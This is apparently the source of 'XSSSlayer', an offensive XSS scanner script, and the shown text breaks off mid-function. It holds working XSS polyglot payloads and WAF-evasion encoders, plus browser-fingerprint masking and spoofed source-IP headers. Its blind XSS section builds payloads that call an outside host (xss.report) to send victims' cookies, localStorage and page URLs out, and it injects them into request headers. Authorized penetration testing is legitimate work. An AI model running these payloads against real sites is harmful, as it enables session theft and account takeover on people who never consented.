#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   XSSSlayer v2.0.0 (Official Release)                        ║
║   High-Performance Intelligent XSS Scanner                   ║
║   Developed by alisalive.exe                                 ║
║   ig: alisalive.exe | github: alisalive                      ║
║   For authorized penetration testing only.                   ║
╚══════════════════════════════════════════════════════════════╝
"""

import asyncio
import os
import signal
import sys
import time
import random
import string
import argparse
import re
import json
import base64
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from ipaddress import IPv4Address
from html import escape as html_escape

from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, BarColumn,
    TextColumn, TimeElapsedColumn, TaskProgressColumn,
)
from rich.align import Align
from rich.rule import Rule
from rich import box

try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
except ImportError:
    print("[ERROR] playwright not installed. Run: pip install playwright && playwright install chromium")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
#  CONSTANTS
# ══════════════════════════════════════════════════════════════
console          = Console()
VERSION          = "v2.0.0"
SEMAPHORE_LIMIT  = 20
PAYLOAD_FILE     = Path(__file__).parent / "payloads.txt"
RESULTS_DIR      = Path(__file__).parent / "results"
SCREENSHOTS_DIR  = RESULTS_DIR / "screenshots"
RETRY_DELAY      = 5
RATE_LIMIT_DELAY = 10
MAX_RETRIES      = 3
DIALOG_TIMEOUT   = 2500    # ms — wait for JS dialog after injection
NAV_TIMEOUT      = 15000   # ms — default navigation timeout
JITTER_MIN       = 0.3     # s  — default minimum jitter
JITTER_MAX       = 1.5     # s  — default maximum jitter
MAX_CRAWL_PAGES  = 30
MAX_RANKED_PL    = 800
MAX_BTN_CLICKS   = 6

PROBE_CHARS = list('<>"\'(){}[];/\\=:#&`|~^')

WAF_SIGNATURES = [
    "cloudflare", "sucuri", "incapsula", "imperva", "akamai", "f5",
    "barracuda", "fortiweb", "modsecurity", "naxsi", "aws waf",
    "wallarm", "radware", "reblaze", "distil",
]

FAKE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# ── Universal Polyglot Payloads ───────────────────────────────
# These 15 payloads bypass most filters/contexts and are tested FIRST.
POLYGLOT_PAYLOADS: list[str] = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"--></style></script><svg onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>",
    "--><!-\"--%><script>alert(1)</script>",
    "';confirm`1`//",
    '"><img/src/onerror=alert(1)>',
    "<details open ontoggle=alert(1)>",
    "javascript:/*</title></style></script></xmp></noscript></noembed></textarea><svg/onload='/*<html>*/alert(1)'>",
    "';}</style><script>alert(1)</script>",
    "0\"onclick=\"alert(1)",
    "'onmouseover='alert(1)",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "\"><svg/onload=eval(atob('YWxlcnQoMSk='))>",
    "/**/alert(1)//",
]

# ══════════════════════════════════════════════════════════════
#  DATA MODELS
# ══════════════════════════════════════════════════════════════
class InjectionContext(Enum):
    HTML_BODY        = "html_body"
    ATTRIBUTE_DQ     = "attr_dq"
    ATTRIBUTE_SQ     = "attr_sq"
    ATTRIBUTE_BARE   = "attr_bare"
    ATTR_NAME        = "attr_name"
    SCRIPT_STRING_DQ = "script_str_dq"
    SCRIPT_STRING_SQ = "script_str_sq"
    SCRIPT_STRING_BT = "script_str_bt"
    SCRIPT_BARE      = "script_bare"
    COMMENT          = "comment"
    STYLE            = "style"
    NOT_REFLECTED    = "not_reflected"

    @property
    def label(self) -> str:
        return {
            "html_body": "HTML Body", "attr_dq": 'Attr="val"',
            "attr_sq": "Attr='val'", "attr_bare": "Attr=bare",
            "attr_name": "Attr name", "script_str_dq": 'Script "str"',
            "script_str_sq": "Script 'str'", "script_str_bt": "Script `tmpl`",
            "script_bare": "Script bare", "comment": "HTML Comment",
            "style": "CSS Style", "not_reflected": "Not Reflected",
        }.get(self.value, self.value)

    @property
    def color(self) -> str:
        return {
            "html_body": "bright_green",
            "attr_dq": "bright_yellow", "attr_sq": "bright_yellow",
            "attr_bare": "yellow", "attr_name": "yellow",
            "script_str_dq": "bright_cyan", "script_str_sq": "bright_cyan",
            "script_str_bt": "cyan", "script_bare": "bright_cyan",
            "comment": "dim white", "style": "magenta",
            "not_reflected": "red",
        }.get(self.value, "white")


CONTEXT_ESCAPES: dict[InjectionContext, list[str]] = {
    InjectionContext.HTML_BODY:        ["", "</p>", "</div>", "</span>", "</h1>", "</td>"],
    InjectionContext.ATTRIBUTE_DQ:     ['">', '" ', '"><', '" autofocus onfocus="'],
    InjectionContext.ATTRIBUTE_SQ:     ["'>", "' ", "'><", "' autofocus onfocus='"],
    InjectionContext.ATTRIBUTE_BARE:   [" ", " autofocus onfocus="],
    InjectionContext.ATTR_NAME:        [" onmouseover=alert(1) x=", " onfocus=alert(1) autofocus "],
    InjectionContext.SCRIPT_STRING_DQ: ['";', '";</script><script>', '\\";'],
    InjectionContext.SCRIPT_STRING_SQ: ["';", "';</script><script>", "\\';" ],
    InjectionContext.SCRIPT_STRING_BT: ["`;", "`;</script><script>"],
    InjectionContext.SCRIPT_BARE:      ["", ";", "\n//"],
    InjectionContext.COMMENT:          ["-->", "--><"],
    InjectionContext.STYLE:            ["</style>", "}</style><script>"],
    InjectionContext.NOT_REFLECTED:    [""],
}


@dataclass
class ContextAnalysis:
    context:    InjectionContext = InjectionContext.NOT_REFLECTED
    token:      str              = ""
    reflection: int              = 0
    raw_before: str              = ""


@dataclass
class FuzzResult:
    allowed: list[str] = field(default_factory=list)
    blocked: list[str] = field(default_factory=list)

    @property
    def blocked_set(self) -> set[str]: return set(self.blocked)
    @property
    def allowed_set(self) -> set[str]: return set(self.allowed)

    def score_payload(self, p: str) -> int:
        return sum(1 for c in self.blocked_set if c in p)

    def rank_payloads(self, payloads: list[str], limit: int = MAX_RANKED_PL) -> list[str]:
        return sorted(payloads, key=self.score_payload)[:limit]

    def summary(self) -> str:
        ok  = " ".join(f"[green]{c}[/]" for c in self.allowed) or "[dim]none[/]"
        bad = " ".join(f"[red]{c}[/]"   for c in self.blocked) or "[dim]none[/]"
        return f"Allowed: {ok}   Blocked: {bad}"


@dataclass
class ScanTarget:
    url:         str  = ""
    param:       str  = ""
    form_action: str  = ""
    form_method: str  = "get"
    input_type:  str  = "text"
    source_page: str  = ""
    is_hidden:   bool = False
    is_json:     bool = False
    is_fragment: bool = False
    json_body:   dict = field(default_factory=dict)

    @property
    def label(self) -> str:
        short  = (self.source_page or self.url).split("?")[0][-45:]
        tags   = ""
        if self.is_hidden:  tags += " [dim](hidden)[/dim]"
        if self.is_json:    tags += " [dim](json)[/dim]"
        if self.is_fragment: tags += " [dim](#fragment)[/dim]"
        return f"[cyan]{short}[/] → [{self.form_method.upper()}] → [yellow]{self.param}[/]{tags}"


# ══════════════════════════════════════════════════════════════
#  LOGO & BANNER
# ══════════════════════════════════════════════════════════════
LOGO = r"""
 ██╗  ██╗███████╗███████╗███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗
 ╚██╗██╔╝██╔════╝██╔════╝██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
  ╚███╔╝ ███████╗███████╗███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
  ██╔██╗ ╚════██║╚════██║╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
 ██╔╝ ██╗███████║███████║███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
"""

def print_banner():
    rendered = Text()
    for line in LOGO.strip("\n").split("\n"):
        rendered.append(line + "\n", style="bold dark_red")

    ver_line = Text()
    ver_line.append(f"  {VERSION} (Official Release)", style="bold white")
    ver_line.append("  ·  ", style="dim white")
    ver_line.append("Context · Fuzz · AI · DOM · Stealth · OOB · HTML Report", style="dim white")

    sig_line = Text()
    sig_line.append("  Developed by ", style="dim white")
    sig_line.append("alisalive.exe", style="white")
    sig_line.append("  |  ig: ", style="dim white")
    sig_line.append("alisalive.exe", style="white")
    sig_line.append("  |  github: ", style="dim white")
    sig_line.append("alisalive", style="white")

    warn = Text("  ⚠  FOR AUTHORIZED PENETRATION TESTING ONLY  ⚠", style="bold white on dark_red")

    console.print(Panel(Align.center(rendered), border_style="white",
                        box=box.ROUNDED, padding=(0, 2)))
    console.print(Align.center(ver_line))
    console.print(Align.center(sig_line))
    console.print(Align.center(warn))
    console.print()


# ══════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════
def ts():          return datetime.now().strftime("%H:%M:%S")
def log_info(m):   console.print(f"[dim]{ts()}[/dim] [bold bright_cyan][ INFO ][/bold bright_cyan] {m}")
def log_warn(m):   console.print(f"[dim]{ts()}[/dim] [bold bright_yellow][ WARN ][/bold bright_yellow] {m}")
def log_hit(m):    console.print(f"[dim]{ts()}[/dim] [bold bright_green][ HIT! ][/bold bright_green] {m}")
def log_error(m):  console.print(f"[dim]{ts()}[/dim] [bold red][ ERR  ][/bold red] {m}")
def log_waf(m):    console.print(f"[dim]{ts()}[/dim] [bold magenta][ WAF  ][/bold magenta] {m}")
def log_bypass(m): console.print(f"[dim]{ts()}[/dim] [bold bright_magenta][BYPASS][/bold bright_magenta] {m}")
def log_crawl(m):  console.print(f"[dim]{ts()}[/dim] [bold bright_blue][CRAWL ][/bold bright_blue] {m}")
def log_form(m):   console.print(f"[dim]{ts()}[/dim] [bold bright_yellow][ FORM ][/bold bright_yellow] {m}")
def log_ctx(m):    console.print(f"[dim]{ts()}[/dim] [bold cyan][ CTX  ][/bold cyan] {m}")
def log_fuzz(m):   console.print(f"[dim]{ts()}[/dim] [bold bright_red][ FUZZ ][/bold bright_red] {m}")
def log_mine(m):   console.print(f"[dim]{ts()}[/dim] [bold bright_green][ MINE ][/bold bright_green] {m}")
def log_ai(m):     console.print(f"[dim]{ts()}[/dim] [bold bright_magenta][  AI  ][/bold bright_magenta] {m}")
def log_poc(m):    console.print(f"[dim]{ts()}[/dim] [bold bright_yellow][ POC  ][/bold bright_yellow] {m}")
def log_oob(m):    console.print(f"[dim]{ts()}[/dim] [bold bright_red][ OOB  ][/bold bright_red] {m}")
def log_dom(m):    console.print(f"[dim]{ts()}[/dim] [bold bright_green][ DOM  ][/bold bright_green] {m}")
def log_stealth(m):console.print(f"[dim]{ts()}[/dim] [bold dim white][STLTH ][/bold dim white] {m}")


# ══════════════════════════════════════════════════════════════
#  STEALTH — Anti-Detection Browser Fingerprint Masking
# ══════════════════════════════════════════════════════════════
STEALTH_INIT_SCRIPT = """
(() => {
    // 1. Hide webdriver flag
    Object.defineProperty(navigator, 'webdriver', {get: () => false, configurable: true});

    // 2. Fake realistic hardware concurrency
    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8, configurable: true});

    // 3. Fake device memory
    try { Object.defineProperty(navigator, 'deviceMemory', {get: () => 8, configurable: true}); } catch(e) {}

    // 4. Fake plugins (headless has none, real Chrome has 3+)
    const mockPlugins = [
        {name:'Chrome PDF Plugin', filename:'internal-pdf-viewer', description:'Portable Document Format'},
        {name:'Chrome PDF Viewer', filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai', description:''},
        {name:'Native Client',     filename:'internal-nacl-plugin', description:''},
    ];
    Object.defineProperty(navigator, 'plugins', {
        get: () => Object.assign(mockPlugins, {
            item: (i) => mockPlugins[i],
            namedItem: (n) => mockPlugins.find(p => p.name === n) || null,
            refresh: () => {},
        }),
        configurable: true,
    });

    // 5. Fake languages
    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en'], configurable: true});

    // 6. Inject chrome runtime object (missing in headless)
    if (!window.chrome) {
        window.chrome = {
            runtime: {}, app: {}, csi: () => {}, loadTimes: () => {},
            webstore: {onInstallStageChanged: {}, onDownloadProgress: {}},
        };
    }

    // 7. Override permissions.query (headless returns 'denied', real Chrome returns 'default')
    const _origQuery = navigator.permissions.query.bind(navigator.permissions);
    navigator.permissions.query = (p) =>
        p.name === 'notifications'
            ? Promise.resolve({state: Notification.permission, onchange: null})
            : _origQuery(p);

    // 8. WebGL vendor / renderer — mimic a real Intel GPU
    try {
        const getParam = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(p) {
            if (p === 37445) return 'Intel Inc.';
            if (p === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
            return getParam.call(this, p);
        };
        const getParam2 = WebGL2RenderingContext.prototype.getParameter;
        WebGL2RenderingContext.prototype.getParameter = function(p) {
            if (p === 37445) return 'Intel Inc.';
            if (p === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
            return getParam2.call(this, p);
        };
    } catch(e) {}

    // 9. Hide automation-related console errors
    const _origError = console.error;
    console.error = (...args) => {
        if (args[0] && String(args[0]).includes('automated')) return;
        _origError(...args);
    };

    // 10. Realistic screen dimensions
    try {
        Object.defineProperty(screen, 'width',  {get: () => 1920, configurable: true});
        Object.defineProperty(screen, 'height', {get: () => 1080, configurable: true});
        Object.defineProperty(screen, 'availWidth',  {get: () => 1920, configurable: true});
        Object.defineProperty(screen, 'availHeight', {get: () => 1040, configurable: true});
    } catch(e) {}
})();
"""

# MutationObserver script — injected per page for DOM XSS detection
DOM_MUTATION_SCRIPT = """
(() => {
    window.__xss_dom_triggered = false;
    const _origAlert   = window.alert;
    const _origConfirm = window.confirm;
    const _origPrompt  = window.prompt;
    window.alert   = (m) => { window.__xss_dom_triggered = true; window.__xss_dom_msg = String(m); };
    window.confirm = (m) => { window.__xss_dom_triggered = true; window.__xss_dom_msg = String(m); return true; };
    window.prompt  = (m) => { window.__xss_dom_triggered = true; window.__xss_dom_msg = String(m); return ''; };

    const obs = new MutationObserver((mutations) => {
        for (const m of mutations) {
            for (const n of m.addedNodes) {
                if (n.nodeName === 'SCRIPT') window.__xss_dom_mutation = true;
            }
        }
    });
    obs.observe(document.documentElement, {childList: true, subtree: true, attributes: true});
})();
"""


# ══════════════════════════════════════════════════════════════
#  WAF BYPASS — ADVANCED ENCODING & OBFUSCATION
# ══════════════════════════════════════════════════════════════

def double_url_encode(text: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(text, safe=""), safe="")

def base64_obfuscate(js_expr: str) -> str:
    b64 = base64.b64encode(js_expr.encode()).decode()
    return f"eval(atob('{b64}'))"

def hex_encode_str(text: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in text)

def unicode_encode_str(text: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in text)


RARE_EVENT_HANDLERS = [
    "onscroll", "onwheel", "ontoggle", "onpointerover", "onpointerenter",
    "onpointerdown", "onpointermove", "onpointerleave", "onanimationstart",
    "onanimationend", "ontransitionend", "oncontextmenu", "ondblclick",
    "onauxclick", "onbeforeinput", "oncompositionstart", "oncompositionend",
    "oncontentvisibilityautostatechange", "onslotchange", "oncopy",
    "oncut", "onpaste", "onselectstart", "onselectionchange",
]

def event_handler_payloads(call_expr: str) -> list[str]:
    pls = []
    for ev in RARE_EVENT_HANDLERS:
        rc = rand_case(ev)
        pls += [
            f"<details open {rc}={call_expr}>",
            f"<img src=1 {rc}={call_expr}>",
            f"<div style='overflow:auto;height:1px' {rc}={call_expr}>x</div>",
            f"<svg {rc}={call_expr}>",
            f"<input {rc}={call_expr} autofocus>",
        ]
    return pls


_COMMENT_JUNK_TARGETS = [
    ("script",  "scr/**/ipt"),
    ("iframe",  "ifr/**/ame"),
    ("onerror", "on/**/error"),
    ("onload",  "on/**/load"),
    ("alert",   "al/**/ert"),
    ("eval",    "ev/**/al"),
    ("img",     "im/**/g"),
    ("svg",     "sv/**/g"),
    ("src",     "sr/**/c"),
]

def inject_comment_junk(payload: str) -> str:
    result = payload
    for original, replacement in _COMMENT_JUNK_TARGETS:
        pattern = re.compile(re.escape(original), re.IGNORECASE)
        if pattern.search(result):
            result = pattern.sub(replacement, result, count=1)
            break
    return result


def rand_case(text: str) -> str:
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in text)

def apply_case_randomizer(payload: str) -> str:
    def _rand(m: re.Match) -> str:
        return rand_case(m.group(0))
    result = re.sub(r'(?<=<)\w+', _rand, payload)
    result = re.sub(
        r'\b(on\w+|src|href|style|action|formaction|data)\b(?=\s*=)',
        _rand, result, flags=re.IGNORECASE,
    )
    return result


# ══════════════════════════════════════════════════════════════
#  WAF BYPASS — NETWORK HELPERS
# ══════════════════════════════════════════════════════════════
def rand_ua() -> str:
    return random.choice(FAKE_USER_AGENTS)

def rand_ip() -> str:
    while True:
        ip = IPv4Address(random.randint(0x01000000, 0xFEFFFFFF))
        if str(ip).split(".")[0] not in ("10","127","172","192","0","169","100"):
            return str(ip)

def encode_payload(p: str) -> str:
    return urllib.parse.quote(p, safe="")

async def setup_page_bypass(page, ua: str, ip: str) -> None:
    async def handle(route):
        try:
            h = dict(route.request.headers)
            h.update({"User-Agent": ua, "X-Forwarded-For": ip,
                      "X-Real-IP": ip, "X-Originating-IP": ip,
                      "X-Remote-IP": ip, "X-Client-IP": ip})
            await route.continue_(headers=h)
        except Exception:
            try:
                await route.continue_()
            except Exception:
                pass
    await page.route("**/*", handle)

async def apply_stealth(page) -> None:
    """Inject fingerprint-masking JS before any page script runs."""
    try:
        await page.add_init_script(STEALTH_INIT_SCRIPT)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════
#  ADAPTIVE CONCURRENCY
# ══════════════════════════════════════════════════════════════
class AdaptiveConcurrency:
    """
    Drop-in replacement for asyncio.Semaphore that temporarily shrinks the
    effective concurrency limit when many 403/429 backoffs happen in a short
    window (a sign the target is actively rate-limiting us), then restores
    the original limit after a cooldown period.
    """
    def __init__(self, limit: int, window_s: float = 20.0, threshold: int = 5,
                 shrink_to: int | None = None, cooldown_s: float = 30.0,
                 background_tasks: list = None):
        self.limit      = limit
        self.semaphore  = asyncio.Semaphore(limit)
        self.window_s   = window_s
        self.threshold  = threshold
        self.shrink_to  = shrink_to or max(2, limit // 4)
        self.cooldown_s = cooldown_s
        self._events:    list[float] = []
        self._throttled  = False
        self._held       = 0
        self._lock       = asyncio.Lock()
        self._background_tasks = background_tasks

    async def __aenter__(self):
        await self.semaphore.acquire()
        return self

    async def __aexit__(self, *exc) -> None:
        self.semaphore.release()

    async def record_backoff(self) -> None:
        """Call whenever a 403/429 is hit. Throttles concurrency if too many happen too fast."""
        now = time.time()
        async with self._lock:
            self._events = [t for t in self._events if now - t < self.window_s]
            self._events.append(now)
            if self._throttled or len(self._events) < self.threshold:
                return
            self._throttled = True
            to_hold = max(0, self.limit - self.shrink_to)
            self._held = to_hold
        for _ in range(to_hold):
            await self.semaphore.acquire()
        log_warn(
            f"Adaptive concurrency: [bold red]{len(self._events)}[/] backoffs in "
            f"{self.window_s:.0f}s → reducing concurrency "
            f"[bright_yellow]{self.limit}→{self.shrink_to}[/] for {self.cooldown_s:.0f}s"
        )
        restore_task = asyncio.ensure_future(self._restore())
        if self._background_tasks is not None:
            self._background_tasks.append(restore_task)

    async def _restore(self) -> None:
        await asyncio.sleep(self.cooldown_s)
        async with self._lock:
            for _ in range(self._held):
                self.semaphore.release()
            self._held = 0
            self._throttled = False
            self._events = []
        log_info(f"Adaptive concurrency: restored to [bright_green]{self.limit}[/] tabs.")


# ══════════════════════════════════════════════════════════════
#  GENERAL HELPERS
# ══════════════════════════════════════════════════════════════
def load_payloads() -> list[str]:
    if not PAYLOAD_FILE.exists():
        log_error(f"payloads.txt not found: {PAYLOAD_FILE}")
        sys.exit(1)
    with open(PAYLOAD_FILE, "r", encoding="utf-8", errors="ignore") as f:
        pl = [ln.rstrip("\n") for ln in f if ln.strip()]
    # Prepend polyglots — they fire first and get highest priority
    combined = POLYGLOT_PAYLOADS + [p for p in pl if p not in set(POLYGLOT_PAYLOADS)]
    log_info(
        f"Payloads: [bold bright_yellow]{len(combined)}[/] "
        f"({len(POLYGLOT_PAYLOADS)} polyglots + {len(pl)} from file)"
    )
    return combined

def gen_token(n: int = 10) -> str:
    return "XSS" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n))

def inject_url(base: str, param: str, value: str, pre_encoded: bool = False) -> str:
    parsed = urllib.parse.urlparse(base)
    if pre_encoded:
        existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        parts, added = [], False
        for k, vals in existing.items():
            if k == param:
                parts.append(f"{urllib.parse.quote(k, safe='')}={value}"); added = True
            else:
                for v in vals:
                    parts.append(f"{urllib.parse.quote(k,safe='')}={urllib.parse.quote(v,safe='')}")
        if not added:
            parts.append(f"{urllib.parse.quote(param,safe='')}={value}")
        return parsed._replace(query="&".join(parts)).geturl()
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()

def is_target_closed_error(e: BaseException) -> bool:
    """
    True if `e` is Playwright's TargetClosedError (browser/page closed
    mid-operation) — expected during a Ctrl+C interrupt, not a real error.
    Checked by class name rather than importing the internal Playwright
    error module, so this stays stable across Playwright versions.
    """
    return type(e).__name__ == "TargetClosedError"

# ── Cooperative shutdown flag ────────────────────────────────────
# Set by the SIGINT handler in xssslayer_entry.py on the first Ctrl+C.
# Never raised as an exception — run_scan()/scan_one_target() poll this
# flag at safe points and cancel their own tasks, so no code path (not
# even Playwright's internal socket writes) is interrupted mid-operation.
_shutdown_requested = False

def request_shutdown() -> None:
    global _shutdown_requested
    _shutdown_requested = True

def is_shutdown_requested() -> bool:
    return _shutdown_requested

def same_origin(a: str, b: str) -> bool:
    pa, pb = urllib.parse.urlparse(a), urllib.parse.urlparse(b)
    return pa.scheme == pb.scheme and pa.netloc == pb.netloc

def slugify(text: str, max_len: int = 40) -> str:
    text = re.sub(r'https?://', '', text)
    text = re.sub(r'[^\w\-.]', '_', text)
    return re.sub(r'_+', '_', text).strip('_')[:max_len]

def parse_cookies(cookie_str: str, url: str) -> list[dict]:
    domain = urllib.parse.urlparse(url).netloc
    cookies = []
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            name, _, value = part.partition("=")
            cookies.append({"name": name.strip(), "value": value.strip(),
                            "domain": domain, "path": "/"})
    return cookies

def _deep_set(obj: dict, dotpath: str, value) -> dict:
    keys = dotpath.split(".")
    cur  = obj
    for k in keys[:-1]:
        cur = cur.setdefault(k, {})
    cur[keys[-1]] = value
    return obj

def _flatten_json(obj, prefix="") -> list[tuple[str, object]]:
    pairs = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            pairs.extend(_flatten_json(v, f"{prefix}.{k}" if prefix else k))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            pairs.extend(_flatten_json(v, f"{prefix}[{i}]"))
    else:
        pairs.append((prefix, obj))
    return pairs


# ══════════════════════════════════════════════════════════════
#  FEATURE: PoC SCREENSHOT
# ══════════════════════════════════════════════════════════════
def _ensure_dirs() -> None:
    SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

async def take_poc_screenshot(page, result: dict) -> str | None:
    try:
        _ensure_dirs()
        ts_str   = datetime.now().strftime("%H%M%S")
        u_slug   = slugify(result.get("url", ""), 30)
        p_slug   = slugify(result.get("param", ""), 15)
        pl_slug  = slugify(result.get("payload", ""), 25)
        fname    = f"{ts_str}__{u_slug}__{p_slug}__{pl_slug}.png"
        fpath    = SCREENSHOTS_DIR / fname
        await page.screenshot(path=str(fpath), full_page=True)
        log_poc(f"Screenshot → [bright_cyan]{fpath.name}[/]")
        return str(fpath)
    except Exception as e:
        log_warn(f"Screenshot failed: {e}")
        return None


# ══════════════════════════════════════════════════════════════
#  FEATURE: CONDITIONAL GUI (Live PoC Replay)
# ══════════════════════════════════════════════════════════════
async def replay_poc_visible(poc_url: str, cookies: list[dict], proxy: str | None) -> None:
    try:
        log_poc(f"[bold bright_yellow]Live PoC browser[/] → [cyan]{poc_url[:80]}[/]")
        launch_opts = {"headless": False, "args": ["--no-sandbox", "--disable-setuid-sandbox"]}
        if proxy:
            launch_opts["proxy"] = {"server": proxy}
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(**launch_opts)
            ctx     = await browser.new_context(ignore_https_errors=True)
            if cookies:
                await ctx.add_cookies(cookies)
            page = await ctx.new_page()
            await apply_stealth(page)
            await page.goto(poc_url, timeout=NAV_TIMEOUT, wait_until="domcontentloaded")
            await asyncio.sleep(8)
            await browser.close()
    except Exception as e:
        log_warn(f"PoC browser error: {e}")


# ══════════════════════════════════════════════════════════════
#  FEATURE: BLIND XSS / OOB PAYLOADS
# ══════════════════════════════════════════════════════════════
def build_blind_payloads(report_id: str) -> list[str]:
    base = f"https://xss.report/c/{report_id}"
    templates = [
        f'"><script src={base}></script>',
        f"'><script src={base}></script>",
        f'<script src={base}></script>',
        f'</script><script src={base}></script>',
        '";}' + f'</style><script src={base}></script>',
        f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{base}\';document.head.appendChild(s)">',
        f'--><script src={base}></script>',
        f'</textarea><script src={base}></script>',
        f'</title><script src={base}></script>',
        f'\\"><script src={base}></script>',
        f'%22><script src={base}></script>',
        f"javascript:var s=document.createElement('script');s.src='{base}';document.head.appendChild(s)",
        f'<svg><animate onbegin="var s=document.createElement(\'script\');s.src=\'{base}\';document.head.appendChild(s)">',
        f'<details open ontoggle="var s=document.createElement(\'script\');s.src=\'{base}\';document.head.appendChild(s)">',
        f"'\"--></style></script><script src={base}></script>",
    ]

    # Exfiltration variants — send cookies, localStorage and current URL to the
    # callback instead of just loading a remote <script>. Useful when the OOB
    # service only logs plain hits and you want the stolen data in the request too.
    exfil_fetch = (
        f"fetch('{base}?c='+encodeURIComponent(document.cookie)"
        f"+'&l='+encodeURIComponent(JSON.stringify(localStorage))"
        f"+'&u='+encodeURIComponent(location.href))"
    )
    exfil_beacon = (
        f"new Image().src='{base}?c='+encodeURIComponent(document.cookie)"
        f"+'&l='+encodeURIComponent(JSON.stringify(localStorage))"
        f"+'&u='+encodeURIComponent(location.href)"
    )
    exfil_templates = [
        f'"><script>{exfil_fetch}</script>',
        f"'><script>{exfil_fetch}</script>",
        f'<script>{exfil_fetch}</script>',
        f'--><script>{exfil_fetch}</script>',
        f'<img src=x onerror="{exfil_beacon}">',
        f'<svg onload="{exfil_beacon}">',
        f'<details open ontoggle="{exfil_beacon}">',
    ]
    existing = set(templates)
    templates += [t for t in exfil_templates if t not in existing]

    log_oob(
        f"Generated [bold bright_red]{len(templates)}[/] Blind XSS / OOB payloads "
        f"(incl. cookie/localStorage/URL exfil variants)"
    )
    return templates


# ══════════════════════════════════════════════════════════════
#  FEATURE: BLIND XSS / OOB — HEADER INJECTION POINTS
# ══════════════════════════════════════════════════════════════
async def inject_oob_headers(ctx, url: str, blind_payloads: list[str],
                             cookies: list | None, proxy: str | None) -> None:
    """
    Fire Blind XSS / OOB payloads into common header-based injection points
    (Referer, User-Agent, X-Forwarded-For). This is blind: no response is
    checked here — the external OOB callback service reports execution later.
    """
    header_names = ["Referer", "User-Agent", "X-Forwarded-For"]
    for header_name, payload in zip(header_names, blind_payloads):
        page = None
        try:
            page = await ctx.new_page()
            await apply_stealth(page)

            async def handle(route, payload=payload, header_name=header_name):
                try:
                    h = dict(route.request.headers)
                    h[header_name.lower()] = payload
                    await route.continue_(headers=h)
                except Exception:
                    try:
                        await route.continue_()
                    except Exception:
                        pass

            await page.route("**/*", handle)
